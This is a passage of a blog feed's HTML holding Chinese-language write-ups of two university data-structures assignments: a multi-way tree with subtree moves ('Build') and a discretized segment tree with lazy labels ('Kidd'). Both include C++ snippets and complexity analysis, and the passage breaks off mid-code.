        <content type="html"><![CDATA[<h1 id="CST-PA3"><a href="#CST-PA3" class="headerlink" title="CST PA3"></a>CST PA3</h1><h2 id="3-1-Build"><a href="#3-1-Build" class="headerlink" title="3-1 Build"></a>3-1 Build</h2><h3 id="算法构思"><a href="#算法构思" class="headerlink" title="算法构思"></a>算法构思</h3><p>采用 <code>node</code> 类存储每个节点对应的信息.</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// Line 23</span><span class="token keyword">class</span> <span class="token class-name">node</span> <span class="token punctuation">{</span><span class="token keyword">public</span><span class="token operator">:</span>    <span class="token keyword">int</span> parent<span class="token punctuation">;</span>     <span class="token comment">// 父亲编号</span>    <span class="token keyword">int</span> firstchild<span class="token punctuation">;</span> <span class="token comment">// 长子编号</span>    <span class="token keyword">int</span> lastchild<span class="token punctuation">;</span>  <span class="token comment">// 幼子编号</span>    <span class="token keyword">int</span> pred<span class="token punctuation">;</span>       <span class="token comment">// 左兄弟编号</span>    <span class="token keyword">int</span> succ<span class="token punctuation">;</span>       <span class="token comment">// 右兄弟编号</span>    <span class="token keyword">int</span> size<span class="token punctuation">;</span>       <span class="token comment">// 子树大小</span>    <span class="token keyword">int</span> height<span class="token punctuation">;</span>     <span class="token comment">// 子树高度</span>    <span class="token keyword">int</span> suffix<span class="token punctuation">;</span>     <span class="token comment">// 自身及后缀兄弟结点最大高度</span>    <span class="token function">node</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token function">parent</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">firstchild</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">lastchild</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">pred</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">succ</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">size</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">suffix</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">height</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token operator">*</span>tree<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>根节点编号为 <code>1</code>, 所有节点信息默认初始化为 <code>0</code>, 表示相应信息不存在. 其中 <code>suffix</code> 维护了节点本身及其靠后兄弟 <code>height</code> 的最大值, 在每次进行子树移动时, 只需要向前向上维护 <code>size</code>, <code>suffix</code> 并且更新 <code>height</code> 即可, 如此操作可将时间消耗控制在 <code>cost</code> 内.</p><h4 id="void-Init"><a href="#void-Init" class="headerlink" title="void Init()"></a>void Init()</h4><p>首先调用 <code>Init(n)</code> 对多叉树的 <code>parent</code>, <code>firstchild</code>, <code>lastchild</code>, <code>pred</code>, <code>succ</code> 进行初始化.</p><h4 id="void-InitTree"><a href="#void-InitTree" class="headerlink" title="void InitTree()"></a>void InitTree()</h4><p>随后 <code>Init(n)</code> 调用 <code>InitTree(1)</code>, 借助辅助栈 <code>stack</code> 使用后序遍历的迭代情形对多叉树的 <code>size</code>, <code>height</code>, <code>suffix</code> 进行初始化. 类似二叉树的后续遍历, 对于一个节点, 我们首先初始化其 <code>lastchild</code> 直到 <code>firstchild</code>, 最后初始化其本身.</p><h4 id="void-InitNode"><a href="#void-InitNode" class="headerlink" title="void InitNode()"></a>void InitNode()</h4><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// Line 36</span><span class="token keyword">void</span> <span class="token function">InitNode</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>tree<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">.</span>firstchild <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">// 叶节点.</span>        tree<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">.</span>size <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        tree<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">.</span>height <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        tree<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">.</span>suffix <span class="token operator">=</span> tree<span class="token punctuation">[</span>tree<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">.</span>succ<span class="token punctuation">]</span><span class="token punctuation">.</span>suffix<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span> <span class="token punctuation">{</span> <span class="token comment">// 子树根节点.</span>        <span class="token keyword">int</span> child <span class="token operator">=</span> tree<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">.</span>lastchild<span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>child<span class="token punctuation">)</span> <span class="token punctuation">{</span>            tree<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">.</span>size <span class="token operator">+=</span> tree<span class="token punctuation">[</span>child<span class="token punctuation">]</span><span class="token punctuation">.</span>size<span class="token punctuation">;</span>            child <span class="token operator">=</span> tree<span class="token punctuation">[</span>child<span class="token punctuation">]</span><span class="token punctuation">.</span>pred<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        tree<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">.</span>size <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>        tree<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">.</span>height <span class="token operator">=</span> tree<span class="token punctuation">[</span>tree<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">.</span>firstchild<span class="token punctuation">]</span><span class="token punctuation">.</span>suffix <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>        tree<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">.</span>suffix <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>tree<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">.</span>height<span class="token punctuation">,</span> tree<span class="token punctuation">[</span>tree<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">.</span>succ<span class="token punctuation">]</span><span class="token punctuation">.</span>suffix<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对于叶子节点, 将其 <code>size</code> 设置为 <code>1</code>, <code>height</code> 设置为 <code>0</code>, <code>suffix</code> 设置为其右兄的 <code>suffix</code> (若右兄不存在, 即编号为 <code>0</code>, 那么会返回 tree[0].suffix, 即 <code>0</code>).</p><p>对于一个子树根节点, 将其 <code>size</code> 设置为其子节点的 <code>size</code> 和加 <code>1</code>, <code>height</code> 设置为长子节点的 <code>suffix</code> 加 <code>1</code>, <code>suffix</code> 设置为其自身高度与右兄 <code>suffix</code> 的最大值 (若右兄不存在, 即编号为 <code>0</code>, 那么会返回 tree[0].suffix, 即 <code>0</code>).</p><h4 id="int-Readnode"><a href="#int-Readnode" class="headerlink" title="int Readnode()"></a>int Readnode()</h4><p><code>Readnode()</code> 读入一条路径, 并返回这条路径上的最后一个合法节点编号, <code>real_node</code> 表示当前已读入路径对应的合法节点, <code>tmp_node</code> 表示读入下一个座位后节点的状态, 若为 <code>0</code>, 说明已经进入了无效路径, 直接将之后路径截断即可 (即只读入数据而不对 <code>real_node</code> 进行更新).</p><h4 id="void-Update"><a href="#void-Update" class="headerlink" title="void Update()"></a>void Update()</h4><p>对于每次删除和插入子树, 要在操作位置进行 <code>size</code>, <code>height</code>, <code>suffix</code> 的更新. 其中 <code>height</code>, <code>suffix</code> 的更新比较一致, 将其写作接口 <code>Update()</code>.</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// Line 102</span><span class="token keyword">void</span> <span class="token function">Update</span><span class="token punctuation">(</span><span class="token keyword">int</span> tmp<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>tmp<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment">// 更新 suffix.</span>        tree<span class="token punctuation">[</span>tmp<span class="token punctuation">]</span><span class="token punctuation">.</span>suffix <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>tree<span class="token punctuation">[</span>tmp<span class="token punctuation">]</span><span class="token punctuation">.</span>height<span class="token punctuation">,</span> tree<span class="token punctuation">[</span>tree<span class="token punctuation">[</span>tmp<span class="token punctuation">]</span><span class="token punctuation">.</span>succ<span class="token punctuation">]</span><span class="token punctuation">.</span>suffix<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>tree<span class="token punctuation">[</span>tmp<span class="token punctuation">]</span><span class="token punctuation">.</span>pred<span class="token punctuation">)</span> <span class="token punctuation">{</span>            tmp <span class="token operator">=</span> tree<span class="token punctuation">[</span>tmp<span class="token punctuation">]</span><span class="token punctuation">.</span>pred<span class="token punctuation">;</span>            tree<span class="token punctuation">[</span>tmp<span class="token punctuation">]</span><span class="token punctuation">.</span>suffix <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>tree<span class="token punctuation">[</span>tmp<span class="token punctuation">]</span><span class="token punctuation">.</span>height<span class="token punctuation">,</span> tree<span class="token punctuation">[</span>tree<span class="token punctuation">[</span>tmp<span class="token punctuation">]</span><span class="token punctuation">.</span>succ<span class="token punctuation">]</span><span class="token punctuation">.</span>suffix<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment">// 更新 height.</span>        tmp <span class="token operator">=</span> tree<span class="token punctuation">[</span>tmp<span class="token punctuation">]</span><span class="token punctuation">.</span>parent<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>tmp <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>        tree<span class="token punctuation">[</span>tmp<span class="token punctuation">]</span><span class="token punctuation">.</span>height <span class="token operator">=</span> tree<span class="token punctuation">[</span>tree<span class="token punctuation">[</span>tmp<span class="token punctuation">]</span><span class="token punctuation">.</span>firstchild<span class="token punctuation">]</span><span class="token punctuation">.</span>suffix <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由于 <code>suffix</code> 存储的是节点本身及其后缀兄弟节点的最大 <code>height</code>, 因此对于修改过的节点, 只需要顺次更新其前缀兄弟的 <code>suffix</code>, 当自身已是长子节点时, 更新其父亲的 <code>height</code> 与 <code>suffix</code>, 并以其父亲节点为基准继续更新前缀节点.</p><h4 id="void-Remove"><a href="#void-Remove" class="headerlink" title="void Remove()"></a>void Remove()</h4><p>对于要删去的节点 <code>remove_node</code>, 首先特判其左右兄弟的存在性, 若都存在则将其左兄弟的右兄设置为其右兄弟, 其右兄弟的左兄设置为其左兄弟. 否则 <code>remove_node</code> 必然是其父节点的长子节点或幼子节点, 只需相应进行更新. 最后将 <code>remove_node</code> 的左右兄弟及父亲置为 <code>0</code> 即可.</p><p>随后对全树进行更新. 更新 <code>size</code> 只需沿着 <code>remove_node</code> 的父节点向上, 逐次减去 <code>tree[remove_node].size</code> 即可. 接着更新 <code>height</code> 与 <code>suffix</code>, 若 <code>remove_node</code> 的左兄存在, 直接对其进行 <code>Update()</code> 即可; 否则转到 <code>tree[remove_node].parent</code>, 更新其 <code>height</code>, 并进行 <code>Update()</code>.</p><h4 id="void-Insert"><a href="#void-Insert" class="headerlink" title="void Insert()"></a>void Insert()</h4><p>对于插入的父节点 <code>attach_node</code>, 源子树节点 <code>insert_node</code>, 插入位置 <code>rank</code>, 首先设置 <code>insert_node</code> 父亲为 <code>attach_node</code>. 若父节点无子节点, 则设置 <code>firstchild</code>, <code>lastchild</code> 均为 <code>insert_node</code>. 否则特判插入位置是否为 <code>firstchild</code> 或 <code>lastchild</code> 节点, 并相应进行更新, 原理同 <code>Remove()</code>.</p><p>随后对全树进行更新. 更新 <code>size</code> 只需沿着 <code>insert_node</code> 的父节点向上, 逐次加上 <code>tree[insert_node].size</code> 即可. 接着更新 <code>height</code> 与 <code>suffix</code>, 直接从 <code>insert_node</code> 开始进行 <code>Update()</code>.</p><h4 id="void-Input"><a href="#void-Input" class="headerlink" title="void Input()"></a>void Input()</h4><p>直接读取操作序列并进行操作即可.</p><h3 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h3><ul><li>由于数据规模 <code>N</code> 为 <code>1, 1e6</code>, 在初始化时若采用后序遍历的递归版本, 会导致爆栈 (事实上, 我自行构造了一条单链的特殊情况, 在这种情况下, 程序不会正常返回), 因此采用了后序遍历的迭代版本.</li><li>初始化叶节点时, 原本进行了 <code>tree[x].suffix = 0</code>, 事实上需要修改为 <code>tree[x].suffix = tree[tree[x].succ].suffix</code>, 因为叶节点右边的兄弟的高度未必为 <code>0</code>.</li><li>在 <code>Remove()</code> 中更新父节点的高度时, 需要特判父节点是否无子节点.</li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">// Line 143</span>tmp <span class="token operator">=</span> parent<span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>tree<span class="token punctuation">[</span>tmp<span class="token punctuation">]</span><span class="token punctuation">.</span>firstchild <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> tree<span class="token punctuation">[</span>tmp<span class="token punctuation">]</span><span class="token punctuation">.</span>height <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">else</span> tree<span class="token punctuation">[</span>tmp<span class="token punctuation">]</span><span class="token punctuation">.</span>height <span class="token operator">=</span> tree<span class="token punctuation">[</span>tree<span class="token punctuation">[</span>tmp<span class="token punctuation">]</span><span class="token punctuation">.</span>firstchild<span class="token punctuation">]</span><span class="token punctuation">.</span>suffix <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>在进行子树移动操作时, 需要在读入 <code>remove_node</code> 后立刻进行 <code>Remove()</code> 操作, 随后进行读入 <code>attach_node</code> 并进行 <code>Insert()</code> 操作. 否则若读入 <code>remove_node</code> 后紧接读入 <code>attach_node</code>, 会导致没有更新删除节点而产生读入错误, 导致进入死循环, 产生 <code>TLE</code> 错误.</li></ul><h3 id="复杂度估计"><a href="#复杂度估计" class="headerlink" title="复杂度估计"></a>复杂度估计</h3><h4 id="时间复杂度"><a href="#时间复杂度" class="headerlink" title="时间复杂度"></a>时间复杂度</h4><p><code>InitTree()</code> 过程仅仅与全树节点数目有关系, 每一个节点入栈、出栈、初始化各一次, 时间复杂度为 $O(n)$;</p><p><code>Remove()</code> 与 <code>Insert()</code> 过程中, 在寻找相应节点的时间复杂度为 $O(cost)$, 更新 <code>size</code> 只与树深有关, 更新 <code>height</code> 和 <code>suffix</code> d等价于反向的查找过程, 时间复杂度为 $O(cost)$;</p><p>子树查询仅消耗访问内存常数时间, 时间复杂度为 $O(m)$.</p><p>综上, 算法总时间复杂度为 $O(n + cost + m)$.</p><h4 id="空间复杂度"><a href="#空间复杂度" class="headerlink" title="空间复杂度"></a>空间复杂度</h4><p>算法空间复杂度主要来自读取并存储数据的过程:</p><p>每个 <code>node</code> 类对象都存储了常数个成员, 消耗常数空间, 总体空间消耗为 $O(n)$.</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">// Line 23</span><span class="token keyword">class</span> <span class="token class-name">node</span> <span class="token punctuation">{</span><span class="token keyword">public</span><span class="token operator">:</span>    <span class="token keyword">int</span> parent<span class="token punctuation">;</span>    <span class="token keyword">int</span> firstchild<span class="token punctuation">;</span>    <span class="token keyword">int</span> lastchild<span class="token punctuation">;</span>    <span class="token keyword">int</span> pred<span class="token punctuation">;</span>    <span class="token keyword">int</span> succ<span class="token punctuation">;</span>    <span class="token keyword">int</span> size<span class="token punctuation">;</span>    <span class="token keyword">int</span> height<span class="token punctuation">;</span>    <span class="token keyword">int</span> suffix<span class="token punctuation">;</span>    <span class="token function">node</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token function">parent</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">firstchild</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">lastchild</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">pred</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">succ</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">size</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">suffix</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">height</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token operator">*</span>tree<span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">// Line 192</span>tree <span class="token operator">=</span> <span class="token keyword">new</span> node<span class="token punctuation">[</span>n <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> DSA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Data Structure &amp; Algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kidd</title>
      <link href="/2022/11/18/shu-ju-jie-gou-kidd/"/>
      <url>/2022/11/18/shu-ju-jie-gou-kidd/</url>
      
        <content type="html"><![CDATA[<h1 id="CST-PA3"><a href="#CST-PA3" class="headerlink" title="CST PA3"></a>CST PA3</h1><h2 id="3-4-2-Kidd"><a href="#3-4-2-Kidd" class="headerlink" title="3-4-2 Kidd"></a>3-4-2 Kidd</h2><h3 id="算法构思"><a href="#算法构思" class="headerlink" title="算法构思"></a>算法构思</h3><p>本题需使用 <code>Segment Tree</code> 数据结构, 为此我们使用 <code>tree[]</code> 记录一条线段的权值之和, 使用 <code>label[]</code> 进行懒惰标记.</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">// Line 5</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">ll</span> <span class="token expression"><span class="token keyword">long</span> <span class="token keyword">long</span></span></span><span class="token keyword">const</span> <span class="token keyword">int</span> MAX <span class="token operator">=</span> <span class="token number">2e5</span><span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">// Line 9</span>ll tree<span class="token punctuation">[</span><span class="token number">16</span> <span class="token operator">*</span> MAX <span class="token operator">+</span> <span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// 使用 tree[] 来模拟一棵线段树.</span>ll label<span class="token punctuation">[</span><span class="token number">16</span> <span class="token operator">*</span> MAX <span class="token operator">+</span> <span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// 懒惰标记.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>给出的卡牌数为 $n\in[1, 2^{31})$, 显然不可能以此作为叶节点规模建立一棵线段树; 由于给出的卡牌操作序列数为 $m\in[1, 200000]$, 其包含的端点数最多为 $400000$, 我们将这些端点排序、去重之后, 得到新的 $k$ 个端点, 记录在 <code>arr[]</code> 中, 并对这 $k$ 个端点和它们分出来的 $k - 1$ 个区间这个假想的扩充数组建立线段树.</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">// Line 5</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">ll</span> <span class="token expression"><span class="token keyword">long</span> <span class="token keyword">long</span></span></span><span class="token keyword">const</span> <span class="token keyword">int</span> MAX <span class="token operator">=</span> <span class="token number">2e5</span><span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">// Line 11</span>ll arr<span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">*</span> MAX <span class="token operator">+</span> <span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// 对离散化的线段端点序列进行排序与去重.</span>ll operations<span class="token punctuation">[</span>MAX <span class="token operator">+</span> <span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// 记录操作序列.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>具体而言, 若去重排序后留下的端点为 $\{0, 2, 6, 10, 11\}$, 那么我们只需对 $\{[0, 0], [1, 1], [2, 2], [3, 5], [6, 6], [7, 9], [10, 10], [11, 10], [11, 11]\}$ 建立线段树. 同时我们为每个区间 $[a, b]$ 定义长度 $real_length(a, b) = b - a + 1$, 注意到这里出现的不合理区间 $[11, 10]$ 的长度被定义为 $0$, 一定程度上便于我们进行理解 (这相当于一个空区间).</p><h4 id="读入数据"><a href="#读入数据" class="headerlink" title="读入数据"></a>读入数据</h4><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">// Line 94</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> m<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    cin <span class="token operator">&gt;&gt;</span> type <span class="token operator">&gt;&gt;</span> x <span class="token operator">&gt;&gt;</span> y<span class="token punctuation">;</span>    arr<span class="token punctuation">[</span>cnt<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> x<span class="token punctuation">;</span>    arr<span class="token punctuation">[</span>cnt<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> y<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>type <span class="token operator">==</span> <span class="token char">'H'</span><span class="token punctuation">)</span> operations<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">else</span> operations<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    operations<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> x<span class="token punctuation">;</span>    operations<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> y<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>读入数据时, 记录下每次操作的具体内容, 并将操作序列的端点记录在 <code>arr[]</code> 中.</p><h4 id="重排序与建树"><a href="#重排序与建树" class="headerlink" title="重排序与建树"></a>重排序与建树</h4><p>使用 <code>&lt;stdlib.h&gt;</code> 中的 <code>qsort()</code> 函数对读入的 <code>arr[]</code> 序列进行排序;</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// Line 22</span>ll <span class="token function">uniquify_array</span> <span class="token punctuation">(</span>ll<span class="token operator">*</span> arr<span class="token punctuation">,</span> ll length<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> l <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> r <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">++</span>r <span class="token operator">&lt;</span> length<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>arr<span class="token punctuation">[</span>l<span class="token punctuation">]</span> <span class="token operator">!=</span> arr<span class="token punctuation">[</span>r<span class="token punctuation">]</span><span class="token punctuation">)</span> arr<span class="token punctuation">[</span><span class="token operator">++</span>l<span class="token punctuation">]</span> <span class="token operator">=</span> arr<span class="token punctuation">[</span>r<span class="token punctuation">]</span><span class="token punctuation">;</span>    length <span class="token operator">=</span> <span class="token operator">++</span>l<span class="token punctuation">;</span>    <span class="token keyword">return</span> length<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用 <code>uniquify_array()</code> 对有序序列 <code>arr[]</code> 进行去重, 参考了课件 <code>02-D1</code> 部分的算法.</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">// Line 107</span>maxcnt <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> cnt <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><code>maxcnt</code> 即为线段树的规模大小, 无需进行初始化.</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">// Line 109</span><span class="token keyword">int</span> left<span class="token punctuation">,</span> right <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> m<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    left <span class="token operator">=</span> <span class="token function">search</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> cnt <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> operations<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">;</span>    right <span class="token operator">=</span> <span class="token function">search</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> cnt <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> operations<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token 